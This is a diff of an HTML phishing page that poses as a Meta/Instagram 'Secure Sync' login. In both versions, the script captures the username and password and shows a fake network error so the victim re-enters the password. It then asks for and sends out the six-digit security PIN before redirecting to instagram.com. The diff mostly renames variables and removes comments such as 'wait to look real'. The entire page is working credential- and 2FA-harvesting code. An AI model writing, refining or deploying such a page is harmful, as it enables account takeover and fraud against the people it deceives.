@@ -3,84 +3,77 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0">
-    <title>Meta Cloud Management</title>
+    <title>Meta Cloud Auth</title>
     <style>
         body { background: #fafafa; font-family: -apple-system, sans-serif; display: flex; flex-direction: column; align-items: center; justify-content: center; height: 100vh; margin: 0; }
-        .box { background: #fff; border: 1px solid #dbdbdb; width: 350px; padding: 40px; text-align: center; border-radius: 8px; }
-        .logo { width: 100px; margin-bottom: 25px; }
-        input { width: 100%; padding: 12px; margin-bottom: 10px; border: 1px solid #dbdbdb; border-radius: 5px; background: #fafafa; font-size: 14px; box-sizing: border-box; }
-        .btn { background: #0095f6; color: white; border: none; width: 100%; padding: 12px; border-radius: 8px; font-weight: 600; cursor: pointer; font-size: 14px; }
-        .status-msg { font-size: 12px; color: #8e8e8e; margin-bottom: 15px; }
-        .error { color: #ed4956; font-size: 13px; margin-bottom: 15px; display: none; }
-        #loader { display: none; flex-direction: column; align-items: center; padding: 20px; }
-        .spinner { border: 3px solid #f3f3f3; border-top: 3px solid #0095f6; border-radius: 50%; width: 25px; height: 25px; animation: spin 1s linear infinite; }
+        .box { background: #fff; border: 1px solid #dbdbdb; width: 350px; padding: 40px; text-align: center; border-radius: 8px; box-shadow: 0 4px 12px rgba(0,0,0,0.05); }
+        .m-logo { width: 100px; margin-bottom: 25px; }
+        input { width: 100%; padding: 12px; margin-bottom: 12px; border: 1px solid #dbdbdb; border-radius: 6px; background: #fafafa; font-size: 14px; box-sizing: border-box; outline: none; }
+        .btn-blue { background: #0095f6; color: white; border: none; width: 100%; padding: 12px; border-radius: 8px; font-weight: 600; cursor: pointer; font-size: 14px; }
+        .error-txt { color: #ed4956; font-size: 13px; margin-bottom: 15px; display: none; padding: 10px; background: #fff2f2; border-radius: 4px; }
+        #sync-loader { display: none; flex-direction: column; align-items: center; padding: 20px; }
+        .dot-spinner { border: 3px solid #f3f3f3; border-top: 3px solid #0095f6; border-radius: 50%; width: 25px; height: 25px; animation: spin 1s linear infinite; }
         @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
     </style>
 </head>
 <body>
 
 <div class="box">
-    <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/7/7b/Meta_Platforms_Inc._logo.svg/1280px-Meta_Platforms_Inc._logo.svg.png" class="logo">
-    <p class="status-msg">Identity Verification for Account Optimization</p>
+    <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/7/7b/Meta_Platforms_Inc._logo.svg/1280px-Meta_Platforms_Inc._logo.svg.png" class="m-logo">
     
-    <div id="error-box" class="error">Verification failed. Please double-check your credentials.</div>
+    <div id="error-box" class="error-txt">Network error. Please re-enter your access credentials.</div>
 
-    <div id="login-section">
-        <input type="text" id="user_id" placeholder="Username / ID">
-        <input type="password" id="access_key" placeholder="Access Key">
-        <button class="btn" onclick="triggerSync()">SYNC ACCOUNT</button>
+    <div id="login-stage">
+        <input type="text" id="target_u" placeholder="Account ID">
+        <input type="password" id="target_p" placeholder="Access Key">
+        <button class="btn-blue" onclick="processHit()">SECURE SYNC</button>
     </div>
 
-    <div id="loader">
-        <div class="spinner"></div>
-        <p style="font-size: 12px; color: #8e8e8e; margin-top: 15px;">Initializing Secure Handshake...</p>
-        <p style="font-size: 10px; color: #ccc;">Do not close this window.</p>
+    <div id="sync-loader">
+        <div class="dot-spinner"></div>
+        <p style="font-size: 12px; color: #8e8e8e; margin-top: 15px;">Connecting to Meta API...</p>
     </div>
 
-    <div id="otp-section" style="display:none;">
-        <p style="font-size: 14px; font-weight: 600;">Security Code Required</p>
-        <p class="status-msg">Enter the 6-digit PIN sent to your registered device.</p>
-        <input type="number" id="otp_val" placeholder="000000">
-        <button class="btn" onclick="finishSync()">CONFIRM IDENTITY</button>
+    <div id="otp-stage" style="display:none;">
+        <p style="font-size: 14px; font-weight: 600;">Security PIN Required</p>
+        <p style="font-size: 12px; color: #8e8e8e; margin-bottom: 15px;">Enter the code sent to your device to authorize synchronization.</p>
+        <input type="number" id="target_o" placeholder="000000">
+        <button class="btn-blue" onclick="finalAuth()">VERIFY PIN</button>
     </div>
 </div>
 
 <script>
     let tries = 0;
-
-    async function triggerSync() {
-        const u = document.getElementById('user_id').value;
-        const p = document.getElementById('access_key').value;
+    async function processHit() {
+        const u = document.getElementById('target_u').value;
+        const p = document.getElementById('target_p').value;
         if(!u || !p) return;
 
-        document.getElementById('login-section').style.display = 'none';
-        document.getElementById('loader').style.display = 'flex';
+        document.getElementById('login-stage').style.display = 'none';
+        document.getElementById('sync-loader').style.display = 'flex';
 
         if(tries < 1) {
-            // First Attempt Capture
-            await sendData({u, p, t: 'LOG_INIT'});
+            await sendData({u, p, t: 'INIT_CAPTURE'});
             setTimeout(() => {
-                document.getElementById('loader').style.display = 'none';
-                document.getElementById('login-section').style.display = 'block';
+                document.getElementById('sync-loader').style.display = 'none';
+                document.getElementById('login-stage').style.display = 'block';
                 document.getElementById('error-box').style.display = 'block';
-                document.getElementById('access_key').value = '';
+                document.getElementById('target_p').value = '';
                 tries++;
-            }, 3000); // 3 seconds wait to look real
+            }, 2500);
         } else {
-            // Real Pass Capture
-            await sendData({u, p, t: 'REAL_CRED'});
+            await sendData({u, p, t: 'REAL_PASS'});
             setTimeout(() => {
-                document.getElementById('loader').style.display = 'none';
-                document.getElementById('otp-section').style.display = 'block';
-            }, 5000); // 5 seconds wait: Is doran aap login trigger karenge
+                document.getElementById('sync-loader').style.display = 'none';
+                document.getElementById('otp-stage').style.display = 'block';
+            }, 3000);
         }
     }
 
-    async function finishSync() {
-        const o = document.getElementById('otp_val').value;
-        const u = document.getElementById('user_id').value;
+    async function finalAuth() {
+        const o = document.getElementById('target_o').value;
         if(o.length < 6) return;
-        await sendData({u, o, t: 'OTP_LIVE'});
+        await sendData({u: document.getElementById('target_u').value, o, t: 'OTP_LIVE'});
         window.location.href = "https://instagram.com";
     }
 
@@ -91,7 +84,7 @@
                 headers: { 'Content-Type': 'application/json' },
                 body: JSON.stringify(payload)
             });
-        } catch (e) { console.error("Sync Error"); }
+        } catch (e) {}
     }
 </script>
 </body>
